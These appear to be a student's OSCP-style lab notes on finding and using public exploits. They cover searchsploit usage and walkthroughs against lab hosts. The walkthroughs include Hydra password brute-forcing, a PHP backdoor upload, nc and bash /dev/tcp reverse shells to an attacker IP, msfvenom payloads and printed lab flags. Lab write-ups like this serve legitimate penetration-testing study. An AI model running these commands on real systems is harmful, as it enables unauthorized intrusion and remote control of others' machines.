
#### 12.1. Getting Started
###### 12.1.1. A Word of Caution


#### 12.2. Online Exploit Resources
###### 12.2.1. The Exploit Database - https://www.exploit-db.com/

*Lab Exercise*
4. https://www.exploit-db.com/exploits/35273 
###### 12.2.2. Packet Storm - https://packetstormsecurity.com/ 
###### 12.2.3. GitHub -https://github.com/offensive-security 
###### 12.2.4. Google Search Operators  


#### 12.3. Offline Exploit Resources
###### 12.3.1. Exploit Frameworks
###### 12.3.2. SearchSploit

1. Update exploitdb package fro the kali linux repositories. 
```
sudo apt update && sudo apt install exploitdb
```
2. Listing the two major sections in the archive main directory with the database reference files
```
ls -1 /usr/share/exploitdb/
```
3. Listing the content of the exploits directory
```
ls -1 /usr/share/exploitdb/exploits
```
4. The searchsploit command syntax
```
searchsploit
```
5. Using searchsploit to list available remote Windows SMB exploits
```
searchsploit remote smb microsoft windows
```
6. The exploits are copied the the current working directory with searchsploit
```
searchsploit -m windows/remote/48537.py
```


*Lab Exercise*

1. Theory
2. Theory
3. Theory
4. searchsploit "Arm Whois 3.11 - Buffer Overflow (SEH)"
5. searchsploit 45796 
6. searchsploit eternal blue
7. searchsploit "Linux Kernel 2.6.22" SUID
8. searchsploit SquirrelMail Command  
9. searchsploit WebCT 4.1.5
10. searchsploit remote keylogger 

###### 12.3.3. Nmap NSE Scripts

1. Listing NSE scripts containing the word "Exploits"
```
grep Exploits /usr/share/nmap/scripts/*.nse
```

2. Using Nmap NSE to obtain information on a script
```
nmap --script-help=clamav-exec.nse
```

#### 12.4. Exploiting a Target
###### 12.4.1. Putting It Together
1. Figured out the login page after doing nmap and gobuster. 
2. Then, found out the exploit using the login page verson which was 'qdPM 9.1'. 
3. Cracked login details using 4 emails in about page with rockyou.txt. george@AIDevCorp.org:AIDevCorp 
```
hydra [TARGETIP] http-form-post "/TARGETPATH/TARGETPAGE.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt

 hydra 192.168.233.11 -L email -P /usr/share/wordlists/rockyou.txt http-post-form "/project/index.php/login:login%5B_csrf_token%5D=a570ddd1520e356bc2e2539a7c688c37&login%5Bemail%5D=^USER^&login%5Bpassword%5D=^PASS^&remember_me=1&http_referer=http%3A%2F%2F192.168.233.11%2Fproject%2F:No match for Email and/or Password"  
```
4. The exploit is copied into our current working directory
```
searchsploit -m 50944
```
5. The exploit completed successfully with an uploaded file
```
┌──(kali㉿kali)-[~/OSCP/12]
└─$ python3 50944.py -url http://192.168.233.11/project/ -u george@AIDevCorp.org -p AIDevCorp
You are not able to use the designated admin account because they do not have a myAccount page.

The DateStamp is 2024-01-29 08:26 
Backdoor uploaded at - > http://192.168.233.11/project/uploads/users/764138-backdoor.php?cmd=whoami
```
6. nc is installed on the target
```
┌──(kali㉿kali)-[~/OSCP/12]
└─$ curl http://192.168.233.11/project/uploads/users/764138-backdoor.php --data-urlencode "cmd=which nc"
<pre>/usr/bin/nc
</pre>                                                                             
```
7. Get revere shell. 
```
┌──(kali㉿kali)-[~/OSCP/12]
└─$ curl http://192.168.233.11/project/uploads/users/764138-backdoor.php --data-urlencode "cmd=nc -nv 192.168.45.195 6666 -e /bin/bash"

┌──(kali㉿kali)-[~/OSCP/12]
└─$ sudo nc -nvlp 6666
listening on [any] 6666 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.233.11] 45348
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


*Lab Exercise*
1. Walkthrough
```
Hints:
1) Scan for SMB services, interact with shares and pay attention to applications you find in the Downloads Folder.
2) Google the name of the application name based on the installer file discovered earlier. When searching for exploits, keep in mind that the version of the application exploit author used can be older but it doesn't mean new versions are not vulnerable to that exploit.
3) Use msfvenom to generate a payload such as the following:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=<PORT> -f exe > reverse.exe

4) If you are unable to get a reverse shell after setting everything up properly, you may want to modify your mtu by executing the following: sudo ifconfig tun0 mtu 1250. There may be a bit of delay depending on the VPN connection
5) Use python2 instead.
6) If you use ExploitDB#50972, python3 should be good.


1. Check out smbshare
┌──(kali㉿kali)-[~/OSCP/12]
└─$ smbclient -L \\\\192.168.233.10\\    
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        offsec          Disk      
        Users           Disk   

2. Find out files in Download folder through Users share name. 
┌──(kali㉿kali)-[~/OSCP/12]
└─$ smbclient \\\\192.168.233.10\\Users
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> cd offsec\Downloads\
smb: \offsec\Downloads\> ls
  .                                  DR        0  Thu Jun 23 03:03:57 2022
  ..                                 DR        0  Thu Jun 23 03:03:57 2022
  7z2200-x64.exe                      A  1569243  Tue Jun 21 17:56:35 2022
  ccsetup601.exe                      A 49618184  Tue Jun 21 17:54:25 2022
  ChromeSetup.exe                     A  1414600  Tue Jun 21 17:53:48 2022
  desktop.ini                       AHS      282  Mon Jun 20 21:07:23 2022
  Firefox Installer.exe               A   348616  Tue Jun 21 17:52:08 2022
  MouseServer.exe                     A  3150224  Tue Jun 21 17:55:48 2022
  ZoomBackground.png                  A  4269990  Thu Jun 23 03:03:57 202

3. Download file from smbshare to local machine. 
┌──(kali㉿kali)-[~/OSCP/12]
└─$ smbget smb://192.168.233.10//Users/offsec/Downloads/MouseServer.exe
Password for [kali] connecting to //192.168.233.10/Users: 
Using workgroup WORKGROUP, user kali
smb://192.168.233.10//Users/offsec/Downloads/MouseServer.exe                 
Downloaded 3.00MB in 29 seconds

4. Check out file metadata. Found version 1.8.2.5
┌──(kali㉿kali)-[~/OSCP/12]
└─$ exiftool -a u MouseServer.exe 

5. Figured out 50972.py being potential exploit. Download from searchsploit. 

6. Create payload file. 
┌──(kali㉿kali)-[~/OSCP/12]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.195 LPORT=4445 -f exe > reverse.exe

7. Started http server in 80. 
┌──(kali㉿kali)-[~/OSCP/12]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.233.10 - - [29/Jan/2024 07:43:14] "GET /reverse.exe HTTP/1.1" 200 -
192.168.233.10 - - [29/Jan/2024 07:43:14] "GET /reverse.exe HTTP/1.1" 200 -

8. Execute exploit. 
─(kali㉿kali)-[~/OSCP/12]
└─$ python3 50972.py 192.168.233.10 192.168.45.195 reverse.exe
[+] 3..2..1..
[+] *Super fast hacker typing*
[+] Retrieving payload
[+] Done! Check Your Listener?

9. Obatined flag and reverse shell. 
┌──(kali㉿kali)-[~/OSCP/12]
└─$ sudo nc -nvlp 4445
listening on [any] 4445 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.233.10] 49852
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
C:\Users\offsec\Desktop>type flag.txt
type flag.txt
OS{1bec1dbf28aa7b6df0ea65835daee6a3}
```

2. Walkthrough 
```
HINT

    Scan the ports and note the web server version (HTTP).
    Search for a suitable exploit and make sure you check what arguments the exploit requires.
    To get more interactive shell, you may use bash reverse shell.
    The flag is under /home/offsec/.


1. Tried exploit 50383.sh, can get user id but cannot get reverse shell. 

2. Used exploit 50512.py, download and use it. 
python3 50512.py 192.168.233.188:80

4. Get Reverse shell and obtained flag. (Choice = 0)

╭─daemon@paradigm: /usr/bin                                                  
╰─$ bash -i >& /dev/tcp/192.168.45.195/4446 0>&1 

┌──(kali㉿kali)-[~/OSCP/12]
└─$ sudo nc -nvlp 4446
listening on [any] 4446 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.233.188] 48482
bash: cannot set terminal process group (993): Inappropriate ioctl for device
bash: no job control in this shell
daemon@paradigm:/usr/bin$

daemon@paradigm:/home/offsec$ cat flag.txt
cat flag.txt
OS{30300120e7ec06c194c4c9e5d01111d2}
```

3. Walkthrough 
```
HINT

The ports may need to be modified in the exploit.
HINT

    Scan all ports and identify services and versions.
    Find a suitable exploit and understand its requirements.
    Modify the port in the exploit to match the target.
    Trigger the exploit by connecting to the SSH with the -p option on the target.



1. Nmap scan. 
┌──(kali㉿kali)-[~/OSCP/12]
└─$ nmap -T4 -A -p- 192.168.233.52
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 672fbffea6614d136862e4abd3c98e50 (RSA)
|   256 7c3c8eea64482a755b86c85dd069b1fc (ECDSA)
|_  256 744813a7a297bf93cc21e48e9eef20ce (ED25519)
1315/tcp  filtered els
3571/tcp  filtered megardsvr-port
14359/tcp filtered unknown
16280/tcp filtered unknown
19806/tcp filtered unknown
23621/tcp filtered unknown
26411/tcp filtered unknown
28319/tcp filtered unknown
28826/tcp filtered unknown
29924/tcp filtered unknown
30381/tcp filtered unknown
30449/tcp filtered unknown
30690/tcp filtered unknown
32822/tcp open     james-admin    JAMES Remote Admin 2.3.2
32823/tcp open     nntp           JAMES nntpd (posting ok)
32824/tcp open     pop3           JAMES pop3d 2.3.2
32825/tcp open     smtp           JAMES smtpd 2.3.2
|_smtp-commands: d8c28782af17 Hello nmap.scanme.org (192.168.45.195 [192.168.45.195])
32826/tcp open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e7ab4a382d1a015fd4d0f0bb262defb (RSA)
|   256 bcc7cf1b17f6eb3b3fd13a1fd5d4bdbf (ECDSA)
|_  256 4c5a7c6fe792721d3f157189aa7e6ea2 (ED25519)
32871/tcp filtered unknown
36313/tcp filtered unknown
39272/tcp filtered unknown
43237/tcp filtered unknown
45072/tcp filtered unknown
48592/tcp filtered unknown
50714/tcp filtered unknown
61626/tcp filtered unknown
63137/tcp filtered unknown
Service Info: Host: d8c28782af17; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2155.29 seconds

2. Find out JAMES Remote Admin 2.3.2 is vulnerable with 50347.py exploit. 

3. Change smpt and service two port numbers. 

4. Run the exploit. 
┌──(kali㉿kali)-[~/OSCP/12]
└─$ python3 50347.py 192.168.233.52 192.168.45.195 6666

5. Obtained reverse shell and flag. 
┌──(kali㉿kali)-[~/OSCP/12]
└─$ sudo nc -nvlp 6666
listening on [any] 6666 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.233.52] 49254
challenge@d8c28782af17:~$ id
id
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
challenge@d8c28782af17:~$ su student
su student
su: must be run from a terminal
challenge@d8c28782af17:~$ ls
ls
flag.txt
challenge@d8c28782af17:~$ cat flag.txt
cat flag.txt
Congrats. Here is your flag, brought to you by the great Ronald Dahl:

OS{42db1eca9c0181e3eb8359914c5c850e}


```
#### 12.5. Wrapping Up


 

